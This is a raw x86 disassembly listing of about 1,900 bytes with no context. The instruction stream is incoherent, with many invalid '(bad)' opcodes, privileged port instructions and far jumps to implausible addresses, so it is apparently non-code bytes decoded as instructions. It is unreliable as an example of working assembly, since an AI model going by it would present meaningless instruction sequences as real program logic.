  41336c:	push   ebp
  41336d:	test   DWORD PTR [edx+0x5],edi
  413370:	mov    cl,0x54
  413372:	outs   dx,DWORD PTR ds:[esi]
  413373:	mov    DWORD PTR [ecx+0x74],edx
  413376:	and    eax,0x729f4c52
  41337b:	loop   0x413308
  41337d:	cli    
  41337e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337f:	rcr    DWORD PTR [edi+ebx*4+0x7e08a5bc],1
  413386:	aaa    
  413387:	dec    ebp
  413388:	nop
  413389:	adc    BYTE PTR [edx-0x59b043e7],bl
  41338f:	inc    ebx
  413390:	push   ds
  413391:	and    esi,DWORD PTR gs:[edx-0x558a723b]
  413398:	pop    ds
  413399:	mov    esp,0x13e32b1b
  41339e:	pop    ebp
  41339f:	pop    esi
  4133a0:	(bad)  
  4133a1:	(bad)  
  4133a2:	out    dx,al
  4133a3:	(bad)  
  4133a4:	pop    esp
  4133a5:	push   edi
  4133a6:	pop    edx
  4133a7:	pop    esp
  4133a8:	xchg   DWORD PTR [edx+0x16727993],esi
  4133ae:	sbb    eax,0x8c289d71
  4133b3:	loopne 0x413366
  4133b5:	jb     0x41333c
  4133b7:	mov    ebp,0xce85ccef
  4133bc:	inc    ecx
  4133bd:	add    bl,BYTE PTR [eax]
  4133bf:	xor    eax,0x697cad6e
  4133c4:	sbb    eax,0x365eda41
  4133c9:	or     al,0xe4
  4133cb:	cmp    al,0x60
  4133cd:	or     DWORD PTR ds:0x5f0c3c96,edx
  4133d3:	push   esp
  4133d4:	(bad)  
  4133d5:	dec    al
  4133d7:	push   es
  4133d8:	adc    DWORD PTR [ebp+edi*2+0x2ff4a6c1],edi
  4133df:	push   ecx
  4133e0:	pop    ds
  4133e1:	cmp    esi,ecx
  4133e3:	dec    ebx
  4133e4:	pop    ebx
  4133e5:	xor    BYTE PTR [esi-0x2ee5dd13],0x40
  4133ec:	adc    DWORD PTR [edx-0x280799b1],0xfffffff0
  4133f3:	xchg   esi,eax
  4133f4:	repz mov WORD PTR [eax+0x71df70a4],fs
  4133fb:	int3   
  4133fc:	(bad)  
  4133fd:	cmp    al,0xa8
  4133ff:	sahf   
  413400:	daa    
  413401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413402:	inc    ebx
  413403:	adc    DWORD PTR [edx],edx
  413405:	mov    eax,0x2454123f
  41340a:	fs sub bh,dl
  41340d:	pop    ebp
  41340e:	popa   
  41340f:	inc    eax
  413410:	les    edx,FWORD PTR [esi]
  413412:	sub    ebp,DWORD PTR [edx+ecx*8+0x457d4b62]
  413419:	dec    esp
  41341a:	test   al,0xe4
  41341c:	mov    al,BYTE PTR [eax]
  41341e:	push   eax
  41341f:	mov    ds:0x3b43c24d,eax
  413424:	jae    0x413415
  413426:	ret    0x5df8
  413429:	adc    edx,DWORD PTR [ebp+0x6ab6da18]
  41342f:	scas   eax,DWORD PTR es:[edi]
  413430:	je     0x413430
  413432:	(bad)  
  413433:	outs   dx,BYTE PTR ds:[esi]
  413434:	iret   
  413435:	and    DWORD PTR [eax+0x7c],esi
  413438:	div    BYTE PTR [ecx+0x5e]
  41343b:	retf   
  41343c:	pop    esp
  41343d:	xchg   esi,eax
  41343e:	and    BYTE PTR [eax+eax*1-0x62b47a8f],al
  413445:	mov    edi,0xc2b5cbea
  41344a:	jle    0x41348f
  41344c:	xor    esp,DWORD PTR [esi+0x40]
  41344f:	xchg   edx,eax
  413450:	pushf  
  413451:	fwait
  413452:	mov    edx,ecx
  413454:	aam    0x48
  413456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413458:	cld    
  413459:	lea    edx,[ebx+0x10db4a72]
  41345f:	rcr    BYTE PTR [esi],cl
  413461:	cdq    
  413462:	and    DWORD PTR [ebx-0x4d],eax
  413465:	call   0xde2d:0xf9cbe6a2
  41346c:	pop    ds
  41346d:	push   0x53
  41346f:	inc    ecx
  413470:	fidivr WORD PTR [ecx+0x71]
  413473:	mov    esp,0xfc2370ba
  413478:	push   esi
  413479:	pop    ebx
  41347a:	xor    edi,ebx
  41347c:	scas   al,BYTE PTR es:[edi]
  41347d:	mov    ds:0xef6c4889,eax
  413482:	pop    ebx
  413483:	imul   ebx,DWORD PTR [eiz*4+0x3f7719bc],0xffffffb8
  41348b:	and    al,0x9e
  41348d:	dec    ebx
  41348e:	popf   
  41348f:	lods   al,BYTE PTR ds:[esi]
  413490:	mov    eax,ds:0xaea48f1c
  413495:	push   eax
  413496:	jmp    0x5432f0c7
  41349b:	xchg   ebp,eax
  41349c:	sar    DWORD PTR [ebp+edi*2+0x2d2d83db],cl
  4134a3:	jp     0x4134fc
  4134a5:	scas   eax,DWORD PTR es:[edi]
  4134a6:	pop    esi
  4134a7:	fdivr  DWORD PTR [edi+0x71fe0392]
  4134ad:	pop    esp
  4134ae:	retf   
  4134af:	dec    edx
  4134b0:	add    DWORD PTR [eax+0x1c4af9ab],0x54
  4134b7:	ss pop eax
  4134b9:	arpl   WORD PTR [esi+0x6eff2964],si
  4134bf:	pop    ds
  4134c0:	out    dx,al
  4134c1:	pop    edx
  4134c2:	dec    esp
  4134c3:	fwait
  4134c4:	or     eax,0xece63e33
  4134c9:	dec    ebx
  4134ca:	adc    eax,0x8e274f5e
  4134cf:	test   eax,0xdbb1bab7
  4134d4:	sub    edx,ebp
  4134d6:	and    al,0xfc
  4134d8:	repz popf 
  4134da:	jge    0x4134b5
  4134dc:	and    BYTE PTR [edi+0x2ff5dba9],0xdd
  4134e3:	cmp    al,0x6a
  4134e5:	dec    edi
  4134e6:	mov    bl,BYTE PTR [edx-0x2]
  4134e9:	mov    ds:0xca125f53,al
  4134ee:	data16 daa 
  4134f0:	jns    0x4134a2
  4134f2:	inc    esi
  4134f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f4:	(bad)  
  4134f6:	addr16 ret 
  4134f8:	sub    DWORD PTR ds:0x7db74e12,esi
  4134fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ff:	push   edi
  413500:	and    BYTE PTR [eax+0x6dc4ff36],bh
  413506:	mov    edi,0x3733c741
  41350c:	ss mov esp,0x8f35588a
  413512:	nop
  413513:	inc    esi
  413514:	cdq    
  413515:	mov    esi,0xeb17c1ac
  41351a:	mov    ecx,0x7d3254b1
  41351f:	cmp    BYTE PTR ss:[edi],cl
  413522:	mov    cl,0x37
  413524:	pusha  
  413525:	push   edi
  413526:	sub    edi,DWORD PTR [ebp+0x4907b665]
  41352c:	mov    ah,0xfe
  41352e:	(bad)
  413533:	fdivr  DWORD PTR [esi]
  413535:	addr16 add ah,bh
  413538:	mov    cl,0x8c
  41353a:	aad    0x64
  41353c:	cmp    ebx,DWORD PTR ds:0xf6fe406a
  413542:	loope  0x41352a
  413544:	icebp  
  413545:	rcl    BYTE PTR [edx-0x3065ba09],0xbe
  41354c:	push   cs
  41354d:	jg     0x4134f2
  41354f:	out    0xf4,al
  413551:	push   cs
  413552:	ins    BYTE PTR es:[edi],dx
  413553:	stc    
  413554:	and    bl,BYTE PTR fs:[ebx-0x33]
  413558:	repnz stos DWORD PTR es:[edi],eax
  41355a:	dec    edi
  41355b:	sbb    dl,BYTE PTR [edx-0x96b1ae0]
  413561:	int    0xcd
  413563:	je     0x413531
  413565:	add    BYTE PTR [ebx+0x15],bh
  413568:	jnp    0x413580
  41356a:	ins    DWORD PTR es:[edi],dx
  41356b:	into   
  41356c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41356d:	js     0x4135cc
  41356f:	aad    0xc3
  413571:	push   esp
  413572:	dec    ebp
  413573:	retf   0x90e4
  413576:	and    DWORD PTR [esi],0x4357e3ee
  41357c:	cmp    DWORD PTR [esp+eiz*8+0x7af54893],edi
  413583:	add    eax,0x7eab7a28
  413588:	push   ecx
  413589:	imul   ebp,DWORD PTR [esi-0x24fde5de],0xffffffcb
  413590:	inc    esp
  413591:	sbb    DWORD PTR [edi+0x6a1abbe],edi
  413597:	mov    cl,0xce
  413599:	sbb    BYTE PTR [esi-0x6274f5a4],ch
  41359f:	inc    eax
  4135a0:	inc    edi
  4135a1:	js     0x413578
  4135a3:	sti    
  4135a4:	in     eax,dx
  4135a5:	stc    
  4135a6:	add    DWORD PTR [esi],ebp
  4135a8:	sub    ecx,DWORD PTR [ebx+0x5d]
  4135ab:	adc    BYTE PTR ds:0xa740,ah
  4135b0:	repnz add BYTE PTR [edx+edx*4],ah
  4135b4:	dec    ecx
  4135b5:	rcr    BYTE PTR [edi-0x48],1
  4135b8:	mov    dl,0x26
  4135ba:	lea    ebx,[edx+0x7fecb045]
  4135c0:	repz sub al,0xbd
  4135c3:	shl    DWORD PTR [eax-0x2c9715e],0x3d
  4135ca:	xchg   ecx,eax
  4135cb:	cmp    BYTE PTR [edi],cl
  4135cd:	mov    ebp,0x18aca6d7
  4135d2:	clc    
  4135d3:	lock lahf 
  4135d5:	daa    
  4135d6:	jo     0x413633
  4135d8:	icebp  
  4135d9:	inc    esi
  4135da:	sbb    esp,ebx
  4135dc:	arpl   WORD PTR cs:[esp+eax*8],ax
  4135e0:	shl    al,0x4d
  4135e3:	and    BYTE PTR ds:0xf2733872,dl
  4135e9:	fnstcw WORD PTR [edx]
  4135eb:	inc    esi
  4135ec:	ret    
  4135ed:	pop    ss
  4135ee:	in     al,0xfe
  4135f0:	fstp   st(6)
  4135f2:	jmp    0x4eb8:0x23c98573
  4135f9:	popf   
  4135fa:	loopne 0x413649
  4135fc:	cmp    eax,DWORD PTR [esi-0x8baf33c]
  413602:	lea    ebx,[ebx-0x70137e]
  413608:	push   0xa
  41360a:	push   ecx
  41360b:	(bad)  
  41360c:	cmp    ah,BYTE PTR [edi-0x43]
  41360f:	aad    0x61
  413611:	out    0xd8,eax
  413613:	or     al,0x6a
  413615:	dec    edx
  413616:	mov    bh,0x56
  413618:	repnz faddp st(5),st
  41361b:	mov    ah,0x1
  41361d:	fsubr  st(5),st
  41361f:	mov    al,0x25
  413621:	mov    dh,0xd6
  413623:	xchg   ebx,eax
  413624:	ror    DWORD PTR [eax+edi*4],cl
  413627:	or     ecx,ebp
  413629:	xchg   edi,eax
  41362a:	xor    bl,dh
  41362c:	push   edi
  41362d:	outs   dx,BYTE PTR es:[esi]
  41362f:	xor    bh,BYTE PTR [ecx]
  413631:	add    al,0xef
  413633:	punpckldq mm3,DWORD PTR [edx-0x6b507928]
  41363a:	retf   
  41363b:	mov    edx,ebp
  41363d:	dec    edi
  41363e:	fbstp  TBYTE PTR ds:0x6ba3a87c
  413644:	jns    0x4135f8
  413646:	leave  
  413647:	ins    BYTE PTR es:[edi],dx
  413648:	test   ax,0xe905
  41364c:	pop    edx
  41364d:	neg    BYTE PTR [ebp+0xa]
  413650:	cdq    
  413651:	out    dx,al
  413652:	jle    0x41360d
  413654:	inc    esp
  413655:	jmp    0xdb9b64f1
  41365a:	add    eax,0x72cdb92f
  41365f:	shl    BYTE PTR [edi],1
  413661:	inc    ebp
  413662:	into   
  413663:	jmp    0xf4b151e6
  413668:	push   0xffffff94
  41366a:	lods   eax,DWORD PTR ds:[esi]
  41366b:	lock loope 0x413658
  41366e:	mov    al,ch
  413670:	mov    bh,0x10
  413672:	div    dh
  413674:	popaw  
  413676:	mov    ch,0x4b
  413678:	xor    ch,BYTE PTR [esi+0x2e00c68a]
  41367e:	neg    BYTE PTR [esi+ecx*4]
  413681:	cmc    
  413682:	fnsave [ebx]
  413684:	rcr    DWORD PTR [ebp+0x2b],cl
  413687:	sub    DWORD PTR [ebx],ebp
  413689:	push   ss
  41368a:	jne    0x413701
  41368c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41368d:	idiv   DWORD PTR [ebx+0x34]
  413690:	mov    bl,0x46
  413692:	xlat   BYTE PTR ds:[ebx]
  413693:	mov    eax,0x58cb2862
  413698:	shl    DWORD PTR [edi],cl
  41369a:	cmp    DWORD PTR [ecx-0x14],eax
  41369d:	sar    DWORD PTR [ecx+0x79d7e2ba],0xd1
  4136a4:	pusha  
  4136a5:	ss pop ebx
  4136a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a8:	sub    al,0x83
  4136aa:	aam    0x21
  4136ac:	cmp    BYTE PTR [eiz*4-0x181914b8],ch
  4136b3:	sbb    al,dh
  4136b5:	cmp    al,0xf2
  4136b7:	sbb    BYTE PTR [ebx+0x3a],ch
  4136ba:	push   ecx
  4136bb:	into   
  4136bc:	ret    0xd665
  4136bf:	ret    0x5bfc
  4136c2:	aam    0x1
  4136c4:	mov    BYTE PTR [eax+0x6f],bl
  4136c7:	inc    esp
  4136c8:	cli    
  4136c9:	(bad)  
  4136ca:	sub    cl,BYTE PTR [esi+ebp*8+0x173f7dd5]
  4136d1:	icebp  
  4136d2:	ror    DWORD PTR [ecx+0x0],cl
  4136d5:	push   ebx
  4136d6:	pop    ebx
  4136d7:	adc    esi,DWORD PTR [edx-0x531fc5f5]
  4136dd:	aaa    
  4136de:	fnsave [edx-0x51f83263]
  4136e4:	lock cmp bl,BYTE PTR [ecx+ebx*4+0x6d7a3172]
  4136ec:	nop
  4136ed:	out    dx,eax
  4136ee:	push   es
  4136ef:	call   FWORD PTR [esi-0x56497423]
  4136f5:	lods   al,BYTE PTR ds:[esi]
  4136f6:	fstp   TBYTE PTR [ecx]
  4136f9:	mov    esp,0x177448bc
  4136fe:	enter  0xceeb,0xa8
  413702:	or     DWORD PTR [eax+0x35],esi
  413705:	mov    esp,0xb927c1e1
  41370a:	loop   0x413789
  41370c:	xor    BYTE PTR [edx-0x14],bl
  41370f:	jnp    0x413722
  413711:	in     eax,0xb4
  413713:	mov    dh,BYTE PTR [ebp+edx*1-0x448a44e3]
  41371a:	inc    esi
  41371b:	xchg   ebp,eax
  41371c:	push   ecx
  41371d:	cwde   
  41371e:	add    DWORD PTR [esi-0x61],0x28360059
  413725:	jmp    0x413706
  413727:	out    0x8c,eax
  413729:	fnstcw WORD PTR [eax+ecx*1-0x70]
  41372d:	xlat   BYTE PTR ds:[ebx]
  41372e:	inc    ebp
  41372f:	dec    BYTE PTR [ecx]
  413731:	push   edi
  413732:	daa    
  413733:	dec    ecx
  413734:	lock retf 0xabf8
  413738:	inc    eax
  413739:	not    BYTE PTR [ebp+0x45c1a2e9]
  41373f:	or     al,0x5b
  413741:	mov    edx,0x43a3c844
  413746:	and    DWORD PTR [ebp-0x147b863],edi
  41374c:	neg    bl
  41374e:	and    ch,BYTE PTR [edi+0x72937801]
  413754:	push   edi
  413755:	xor    ah,BYTE PTR [ebp+0x69564107]
  41375b:	scas   al,BYTE PTR es:[edi]
  41375c:	(bad)  
  41375d:	mov    ah,0xbd
  41375f:	cmp    eax,0xd3f74b9e
  413764:	push   cs
  413765:	jne    0x41375e
  413767:	xchg   edi,eax
  413768:	(bad)  
  413769:	cmp    ah,BYTE PTR [edx+eax*2-0x2003d08]
  413770:	jge    0x4137a3
  413772:	bound  ebx,QWORD PTR [ebp+0x52]
  413775:	xlat   BYTE PTR ds:[ebx]
  413776:	fistp  QWORD PTR [edi+0x4a162f57]
  41377c:	fidivr DWORD PTR [edx-0x7e164960]
  413782:	adc    al,0x43
  413784:	sbb    DWORD PTR [edx+0x500af71e],esi
  41378a:	jg     0x413784
  41378c:	outs   dx,BYTE PTR ds:[esi]
  41378d:	pop    ss
  41378e:	jle    0x4137ed
  413790:	mov    bl,0x2
  413792:	xchg   esp,eax
  413793:	jmp    0xfaa3:0xb256f0c1
  41379a:	cmp    ch,BYTE PTR [ebx+0x5fcac661]
  4137a0:	ins    DWORD PTR es:[edi],dx
  4137a1:	sbb    BYTE PTR [ebx],dl
  4137a3:	rol    DWORD PTR [eax-0x681b2d6b],cl
  4137a9:	pop    ebx
  4137aa:	repz inc edi
  4137ac:	aam    0xbd
  4137ae:	push   ss
  4137af:	in     eax,0x2d
  4137b1:	js     0x413793
  4137b3:	scas   eax,DWORD PTR es:[edi]
  4137b4:	add    DWORD PTR [edx-0x6],0x91dcee94
  4137bb:	xor    ah,bh
  4137bd:	lds    ebp,FWORD PTR [ecx-0x695d9dfb]
  4137c3:	or     ebp,DWORD PTR [eax+0x53]
  4137c6:	add    al,0xb0
  4137c8:	lods   al,BYTE PTR ds:[esi]
  4137c9:	in     al,0x3d
  4137cb:	or     DWORD PTR [edx+ecx*2],ecx
  4137ce:	or     BYTE PTR [ecx-0x43],0x24
  4137d2:	mov    ds:0x1dfdf8e1,al
  4137d7:	popa   
  4137d8:	pop    ebx
  4137d9:	ins    DWORD PTR es:[edi],dx
  4137da:	out    0x94,eax
  4137dc:	mov    bh,al
  4137de:	xor    eax,0xcda1cd9c
  4137e3:	outs   dx,BYTE PTR ds:[esi]
  4137e4:	icebp  
  4137e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137e6:	repnz (bad) 
  4137e9:	dec    ecx
  4137ea:	sbb    BYTE PTR [edx],dh
  4137ec:	arpl   sp,sp
  4137ee:	cwde   
  4137ef:	xchg   ebx,eax
  4137f0:	pop    ss
  4137f1:	lock mov eax,0x724b9f59
  4137f7:	cmp    DWORD PTR [ebx+0x2af94e34],eax
  4137fd:	call   0x6acd:0xb935a55f
  413804:	xchg   ebp,eax
  413805:	mov    bl,BYTE PTR [edi-0x1dcf87cd]
  41380b:	cs pop esi
  41380d:	cmp    eax,0x8586d9b6
  413812:	pushf  
  413813:	jbe    0x41384b
  413815:	lods   eax,DWORD PTR ds:[esi]
  413816:	jb     0x413825
  413818:	push   es
  413819:	add    DWORD PTR [esi+0x5d],0xd5511e2
  413820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413821:	push   ss
  413822:	push   ss
  413823:	icebp  
  413824:	(bad)  
  413825:	es pop edi
  413827:	out    dx,eax
  413828:	les    ecx,FWORD PTR ds:0x6eb895bf
  41382e:	sub    al,0x45
  413830:	sbb    DWORD PTR [ebp-0x1f],ebp
  413833:	xchg   esi,eax
  413834:	xlat   BYTE PTR ds:[ebx]
  413835:	cld    
  413836:	hlt    
  413837:	add    al,0x61
  413839:	test   BYTE PTR [ecx+0x60],bl
  41383c:	add    ah,bh
  41383e:	or     al,0x62
  413840:	sub    BYTE PTR [esi+0x71],bh
  413843:	mov    ecx,0xbf447a0e
  413848:	cmp    bh,cl
  41384a:	(bad)  
  41384c:	inc    eax
  41384d:	lds    ebp,FWORD PTR [eax-0x572e4a5d]
  413853:	gs jecxz 0x413822
  413856:	fist   DWORD PTR [esi+edx*2]
  413859:	push   ebx
  41385a:	and    al,0xf0
  41385c:	sbb    BYTE PTR [ebx],0x97
  41385f:	xchg   esi,eax
  413860:	mov    al,ds:0xd6b698eb
  413865:	pop    esi
  413866:	pop    es
  413867:	mov    ebp,0xb51e7471
  41386c:	add    dl,ch
  41386e:	fnstsw WORD PTR [edi+0x543585ae]
  413874:	or     eax,0xf8ae568c
  413879:	sub    dl,ah
  41387b:	mov    DWORD PTR [ebx+0x2f660335],ecx
  413881:	data16 loop 0x4138f6
  413884:	fs mov cl,0x8f
  413887:	mov    edi,0xec02bdd7
  41388c:	cs mov dl,0x19
  41388f:	(bad)  
  413890:	cmc    
  413891:	xchg   edi,eax
  413892:	mov    esi,0x91ce5492
  413897:	imul   eax,DWORD PTR ds:0xf22fd890,0x79
  41389e:	test   dh,bl
  4138a0:	stos   BYTE PTR es:[edi],al
  4138a1:	test   DWORD PTR [esi+0x6d],edx
  4138a4:	pop    edi
  4138a5:	xchg   ebx,eax
  4138a6:	mov    eax,DWORD PTR ds:0xbd93231e
  4138ac:	xor    esi,DWORD PTR [ebx]
  4138ae:	retf   
  4138af:	pushf  
  4138b0:	sub    ebp,DWORD PTR [ecx+eiz*1-0x26760abc]
  4138b7:	je     0x413930
  4138b9:	dec    edi
  4138ba:	rcl    BYTE PTR [eax-0x16cba8ba],1
  4138c0:	jae    0x41387f
  4138c2:	mov    ebx,DWORD PTR [edx+0x30]
  4138c5:	xchg   esi,eax
  4138c6:	sti    
  4138c7:	in     al,dx
  4138c8:	dec    ebx
  4138c9:	jae    0x4138c4
  4138cb:	jg     0x4138a1
  4138cd:	aaa    
  4138ce:	xchg   DWORD PTR [edx],eax
  4138d0:	and    al,0xa1
  4138d2:	rol    DWORD PTR ds:0xf829ce3a,cl
  4138d8:	aas    
  4138d9:	jmp    0xb73f:0x581d4479
  4138e0:	gs pusha 
  4138e2:	or     ch,cl
  4138e4:	ins    BYTE PTR es:[edi],dx
  4138e5:	inc    edx
  4138e6:	aam    0xec
  4138e8:	in     eax,dx
  4138e9:	add    DWORD PTR [edx-0x7b],eax
  4138ec:	dec    ebp
  4138ed:	dec    edi
  4138ee:	mov    al,0x66
  4138f0:	stos   DWORD PTR es:[edi],eax
  4138f1:	pusha  
  4138f2:	sub    BYTE PTR [ebx],0x59
  4138f5:	test   DWORD PTR ds:0x2ab1f3bf,ebx
  4138fb:	add    eax,0x684f2115
  413900:	lods   al,BYTE PTR ds:[esi]
  413901:	mov    al,ds:0x652b0e55
  413906:	scas   al,BYTE PTR es:[edi]
  413907:	stos   BYTE PTR es:[edi],al
  413908:	push   edx
  413909:	xchg   esi,eax
  41390a:	mov    bh,0x81
  41390c:	(bad)
  41390f:	pop    eax
  413910:	(bad)  
  413911:	ins    BYTE PTR es:[edi],dx
  413912:	jle    0x41391e
  413914:	stc    
  413915:	addr16 pushf 
  413917:	fwait
  413918:	pop    ebx
  413919:	bnd cs jnp 0x413991
  41391d:	add    ebp,DWORD PTR ds:0xc6be2bbf
  413923:	int    0x3f
  413925:	test   DWORD PTR es:[esi+0x70ac4a1f],ebx
  41392c:	dec    eax
  41392d:	scas   eax,DWORD PTR es:[edi]
  41392e:	jbe    0x413967
  413930:	enter  0xda5,0x93
  413934:	fsub   QWORD PTR [edx-0x6d]
  413937:	mov    bl,BYTE PTR [edx]
  413939:	ret    
  41393a:	pop    ecx
  41393b:	mov    esp,0x3a8fcaf0
  413940:	jle    0x4138f6
  413942:	mov    dh,0xf6
  413944:	sar    al,cl
  413946:	add    BYTE PTR [ebx+0x7f],ch
  413949:	xchg   ecx,eax
  41394a:	out    0x7d,al
  41394c:	(bad)  
  41394d:	in     al,0x15
  41394f:	inc    BYTE PTR [eax-0x24fa51af]
  413955:	leave  
  413956:	ret    0x74ad
  413959:	xchg   edx,eax
  41395a:	jne    0x413981
  41395c:	adc    eax,0x1a18d5e0
  413961:	sahf   
  413962:	push   esp
  413963:	call   0xc6de:0x10af9edd
  41396a:	jo     0x4139c8
  41396c:	dec    esp
  41396d:	hlt    
  41396e:	inc    esi
  41396f:	inc    edx
  413970:	aas    
  413971:	sbb    DWORD PTR [ecx+0x39],edx
  413974:	(bad)  
  413975:	loope  0x4139a0
  413977:	sub    eax,0x22801cb2
  41397c:	push   ecx
  41397d:	shl    DWORD PTR [ebp-0x480bea66],cl
  413983:	cmp    BYTE PTR [edx+0x669fff12],dh
  413989:	arpl   WORD PTR [eax-0x71a4062a],si
  41398f:	jge    0x413945
  413991:	add    bh,al
  413993:	or     al,0x6
  413995:	stc    
  413996:	fld    QWORD PTR [edx]
  413998:	mov    es,WORD PTR [edx-0x1b]
  41399b:	add    DWORD PTR [esi+ebx*8-0x16],ecx
  41399f:	cmp    BYTE PTR [ebx-0x4be3bd9f],dh
  4139a5:	popf   
  4139a6:	xor    edx,eax
  4139a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a9:	cli    
  4139aa:	push   ds
  4139ab:	pop    esi
  4139ac:	push   ebp
  4139ad:	sbb    ecx,DWORD PTR [ebp+0x38f9cf45]
  4139b3:	pop    ecx
  4139b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b5:	stos   BYTE PTR es:[edi],al
  4139b6:	adc    al,0xa4
  4139b8:	pop    eax
  4139b9:	pushw  cs
  4139bb:	xor    eax,0xfdd7bb0f
  4139c0:	imul   edi,ecx,0x6f806133
  4139c6:	mov    esi,0xa6ee7d41
  4139cb:	mov    al,ds:0x7f8ba31e
  4139d0:	lods   al,BYTE PTR ds:[esi]
  4139d1:	xlat   BYTE PTR ds:[ebx]
  4139d2:	sbb    dh,dl
  4139d4:	inc    edi
  4139d5:	imul   esi,esp,0xa
  4139d8:	mov    edi,0xb99bca0f
  4139dd:	js     0x413a4b
  4139df:	mov    al,0x4d
  4139e1:	pop    ss
  4139e2:	mov    edx,0x19c5cc2f
  4139e7:	push   0x20
  4139e9:	sub    BYTE PTR [esi-0x63],al
  4139ec:	mov    eax,0x92ae19c6
  4139f1:	xor    eax,0x77034f11
  4139f6:	inc    BYTE PTR [ebp+0x5139b542]
  4139fc:	xor    edi,DWORD PTR [esi+ebx*4]
  4139ff:	adc    BYTE PTR [edi+0x6e],bl
  413a02:	jb     0x4139e9
  413a04:	adc    eax,0x9c7d3720
  413a09:	addr16 push ds
  413a0b:	dec    esi
  413a0c:	fmul   QWORD PTR [edi-0x3705a8]
  413a12:	cmp    DWORD PTR [ebx+0x75],eax
  413a15:	ret    0x764
  413a18:	push   esi
  413a19:	add    esi,DWORD PTR [ecx+edi*1+0x5c304dc8]
  413a20:	pushf  
  413a21:	call   0x770630a4
  413a26:	xor    al,0xdd
  413a28:	pop    ebp
  413a29:	add    al,0xeb
  413a2b:	jg     0x4139e1
  413a2d:	mov    dh,0xc1
  413a2f:	dec    ebx
  413a30:	mov    ch,0xcd
  413a32:	push   es
  413a33:	add    bh,BYTE PTR [edi+ebp*1+0xb478bab]
  413a3a:	and    edi,DWORD PTR [edi+0x5203d3d4]
  413a40:	clc    
  413a41:	js     0x413a40
  413a43:	jle    0x413a3c
  413a45:	mov    eax,ds:0xf6e7306c
  413a4a:	sbb    BYTE PTR [edx-0x70e86944],bh
  413a50:	inc    esi
  413a51:	adc    al,0x76
  413a53:	add    eax,0xf06731b2
  413a58:	test   BYTE PTR [esp+eax*1],0x19
  413a5c:	stos   BYTE PTR es:[edi],al
  413a5d:	outs   dx,BYTE PTR ds:[esi]
  413a5e:	and    bh,dh
  413a60:	pop    ebp
  413a61:	push   eax
  413a62:	or     edi,DWORD PTR [ebp+0xd]
  413a65:	imul   ebp,DWORD PTR [esi],0xd68bc464
  413a6b:	lods   eax,DWORD PTR ds:[esi]
  413a6c:	dec    edx
  413a6d:	push   ebx
  413a6e:	lock jge 0x413a17
  413a71:	inc    esp
  413a72:	fcmovnb st,st(6)
  413a74:	mov    eax,ds:0x685d435f
  413a79:	mov    DWORD PTR [esi+0x77c18f9c],ebp
  413a7f:	pop    ebp
  413a80:	call   0xa19d:0xfec33d0d
  413a87:	and    DWORD PTR [ebp+0x34],esp
  413a8a:	pop    es
  413a8b:	and    BYTE PTR [ebx+0x6b],0x76
  413a8f:	and    eax,0xe98c4d9d
  413a94:	mov    bh,0xc9
  413a96:	jl     0x413b12
  413a98:	xchg   ebp,eax
  413a99:	inc    ebx
  413a9a:	pop    ss
  413a9b:	sbb    al,0xf2
  413a9d:	mov    ebx,DWORD PTR [ebx+0x3824ec74]
  413aa3:	or     DWORD PTR [esi-0x35],esi
  413aa6:	push   edi
  413aa7:	or     DWORD PTR [edx-0x26950adc],0xffffffcb
  413aae:	scas   eax,DWORD PTR es:[edi]
  413aaf:	push   esi
  413ab0:	cld    
  413ab1:	jmp    0x413a41
  413ab3:	shl    BYTE PTR [edi-0x4d],cl
  413ab6:	or     al,0x32
  413ab8:	cli    
  413ab9:	mov    esi,0x2f9bd27c
  413abe:	and    eax,DWORD PTR [ebp+0x7a]
  413ac1:	mov    eax,0xd1d19fbb
  413ac6:	in     al,0x4e
  413ac8:	into   
  413ac9:	popf   
  413aca:	je     0x413a71
  413acc:	xchg   cl,ch
  413ace:	pop    ds
  413acf:	int    0xf8
  413ad1:	jge    0x413a7b
  413ad3:	ror    DWORD PTR [esi+0x5d],1
  413ad6:	out    dx,al
  413ad7:	sbb    BYTE PTR [ebp-0x39],0xcb
  413adb:	shl    ebp,0x3a
  413ade:	ja     0x413b13
  413ae0:	and    ebx,DWORD PTR [ebp+0x43]
  413ae3:	hlt    
  413ae4:	and    BYTE PTR [edi-0x74e18ec4],dh
  413aea:	jns    0x413afd
  413aec:	in     eax,0xb3
  413aee:	js     0x413b0f
  413af0:	lods   eax,DWORD PTR ds:[esi]
  413af1:	xor    eax,0x2e86cd5e
  413af6:	xchg   esi,eax
  413af7:	sub    DWORD PTR [edx-0x718c0b90],ebp
  413afd:	(bad)  
  413afe:	xchg   ecx,eax
  413aff:	or     edx,edx
  413b01:	inc    edi
  413b02:	fidiv  DWORD PTR [esi]
  413b04:	add    cl,BYTE PTR [edx]
  413b06:	imul   edi,DWORD PTR [edi],0xb67b8e23
  413b0c:	imul   ecx,DWORD PTR [esi-0x1e],0x47
  413b10:	stos   DWORD PTR es:[edi],eax
  413b11:	dec    esi
  413b12:	adc    al,0x69
  413b14:	fcom   DWORD PTR [ebp+0x1970b75]
  413b1a:	mov    cl,0xae
  413b1c:	adc    DWORD PTR [edi],esi
  413b1e:	mov    ebp,0x2e9eb363
  413b23:	jns    0x413af6
  413b25:	inc    esi
  413b26:	mov    dl,0xc7
  413b28:	(bad)  
  413b2a:	cmp    al,0xb
  413b2c:	adc    BYTE PTR [ebx-0x5f],dl
  413b2f:	pop    ecx
  413b30:	mov    edx,0xd3db0562
  413b35:	stos   DWORD PTR es:[edi],eax
  413b36:	adc    BYTE PTR [ebp-0x1e],dh
  413b39:	cmp    BYTE PTR [edx-0x3eee7d03],cl
  413b3f:	and    esp,ebx
  413b41:	icebp  
  413b42:	inc    edi
  413b43:	jmp    0x413b33
  413b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b46:	mov    ah,0xfb
  413b48:	jne    0x413b51
